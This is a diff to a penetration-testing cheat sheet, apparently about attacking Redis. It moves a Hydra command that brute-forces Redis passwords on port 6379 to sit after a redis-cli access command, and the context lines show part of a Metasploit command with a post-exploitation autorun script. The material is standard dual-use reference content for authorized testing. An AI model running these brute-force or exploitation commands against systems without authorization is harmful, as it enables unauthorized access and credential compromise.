@@ -856,6 +856,16 @@ Unauthorized Access
 redis-cli -h $TARGET -p 6379
 ```
 
+#### [Hydra](https://github.com/vanhauser-thc/thc-hydra)
+
+{% hint style="info" %}
+Brute Force Creds
+{% endhint %}
+
+```bash
+hydra -P passwords.txt -s 6379 $TARGET redis
+```
+
 #### Metasploit-Framework
 
 {% hint style="info" %}
@@ -913,14 +923,4 @@ msfconsole -qx "
     set StageEncoder true;
     set AutoRunScript /tmp/post-exp.rc;
     run -j"
-```
-
-#### [Hydra](https://github.com/vanhauser-thc/thc-hydra)
-
-{% hint style="info" %}
-Brute Force Creds
-{% endhint %}
-
-```bash
-hydra -P passwords.txt -s 6379 $TARGET redis
 ```
